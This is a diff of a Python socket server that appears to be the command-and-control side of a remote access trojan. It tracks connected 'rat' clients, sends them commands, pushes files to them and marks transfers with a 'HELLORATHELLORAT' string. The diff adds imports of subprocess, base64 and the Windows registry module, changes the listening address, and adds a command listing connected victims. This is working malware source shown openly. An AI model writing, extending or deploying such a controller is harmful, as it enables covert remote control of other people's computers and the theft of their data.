@@ -1,11 +1,14 @@
 import socket
-import sys
+import sys, base64, os, socket, subprocess
+from winreg import *
 from _thread import *
 import random
 import time
 
-HOST = '10.3.39.117'  # Symbolic name meaning all available interfaces
+HOST = '10.3.36.160'  # Symbolic name meaning all available interfaces
 PORT = 80  # Arbitrary non-privileged port
+
+
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 print('Socket created')
@@ -57,15 +60,6 @@ def inputter():
             rat_id = xxx[1]
             conns[int(rat_id)].sendall(str.encode(">>" + xxx[2] + ">>" + xxx[3]))
             if xxx[2] == "file":
-                '''
-                conns[int(rat_id)].sendall(str.encode(">>" + xxx[2] + ">>" + xxx[3]))
-                file = open(xxx[3], 'rb')
-                print(file)
-                data = file.read()
-                #print(type(data), data)
-                conns[int(rat_id)].sendall(data)
-                file.close()
-                '''
                 with open(xxx[3], 'rb') as f:
                     while 1:
                         file_data = f.read()
@@ -78,7 +72,8 @@ def inputter():
                 conns[int(rat_id)].sendall(str.encode('HELLORATHELLORAT'))
                 print("The Last")
                 time.sleep(1)
-
+        elif "list" == command:
+            print(conns.keys())
 
 # now keep talking with the client
 while 1:
